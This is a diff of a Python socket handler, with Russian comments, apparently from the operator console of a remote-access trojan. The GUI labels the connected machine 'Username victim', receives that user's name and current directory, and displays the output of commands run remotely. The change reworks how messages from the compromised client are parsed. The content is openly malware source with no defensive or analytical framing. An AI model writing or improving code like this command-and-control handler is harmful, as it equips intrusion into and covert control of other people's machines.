@@ -40,63 +40,50 @@ def get_current_directory(client_socket):
     return current_dir
 
 def handle_client(client_socket, text_box, username_label):
+    # Сначала получаем имя пользователя
+    user_name = ""
     while True:
-        buffer = ""
-        while True:
-            chunk = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
-            if not chunk:
-                break
-            buffer += chunk
-            if "END_OF_MSG" in buffer:
-                break
-
-        if not buffer:
-            break
-
-        # Удаляем маркер и пробелы
-        buffer = buffer.replace("END_OF_MSG", "").strip()
-        if not buffer:
-            continue
-
-        # Обработка по префиксам
-        if buffer.startswith("USER:"):
-            user_name = buffer[5:]
+        data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
+        user_name += data
+        if "END_OF_USER_MSG" in user_name:
+            user_name = user_name.replace("END_OF_USER_MSG", "").strip()
             active_user[0] = user_name
             username_label.configure(text=f"Username victim: {active_user[0]}")
             safe_textbox_insert(text_box, f"👤 Пользователь: {user_name}\n")
-            continue
+            break
 
-        elif buffer.startswith("DIR:"):
-            current_dir = buffer[4:]
+    # Потом получаем текущую директорию
+    current_dir = ""
+    while True:
+        data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
+        current_dir += data
+        if "END_OF_DIR_MSG" in current_dir:
+            current_dir = current_dir.replace("END_OF_DIR_MSG", "").strip()
             safe_textbox_insert(text_box, f"📁 Директория: {current_dir}\n")
-            continue
+            break
 
-        elif buffer.startswith("INFO:"):
-            info = buffer[5:]
-            safe_textbox_insert(text_box, f"🖥 Системная информация:\n{info}\n")
-            continue
+    # Теперь основной цикл для приёма команд
+    buffer = ""
+    while True:
+        try:
+            chunk = client_socket.recv(1024).decode("utf-8", errors="replace")
+            if not chunk:
+                break
+            buffer += chunk
 
-        elif buffer.startswith("CMD:"):
-            command = buffer[4:]
-            if command.lower() in ("exit", "cls", "clear"):
-                if command.lower() in ("cls", "clear"):
-                    text_box.configure(state="normal")
-                    text_box.delete("1.0", "end")
-                    text_box.configure(state="disabled")
-                else:
+            while True:
+                pos = buffer.find("END_OF_MSG")
+                if pos == -1:
                     break
-                continue
+                message = buffer[:pos].strip()
+                buffer = buffer[pos + len("END_OF_MSG"):]
 
-            response = execute_command(command)
-            print(f"Отправлен ответ: {response}")
-            client_socket.send((response + "END_OF_MSG").encode(encoding="utf-8", errors="replace"))
-            safe_textbox_insert(text_box, f"📤 Ответ от клиента:\n{response}\n")
-            continue
+                safe_textbox_insert(text_box, f"💻 Результат команды:\n{message}\n")
 
-        else:
-            # Непредсказуемое сообщение — игнор или лог
-            print(f"[⚠️ Неизвестный тип сообщения]: {buffer}")
-            continue
+        except Exception as e:
+            safe_textbox_insert(text_box, f"Ошибка: {e}\n")
+            break
+
 
 def is_message_end(data):
     return (
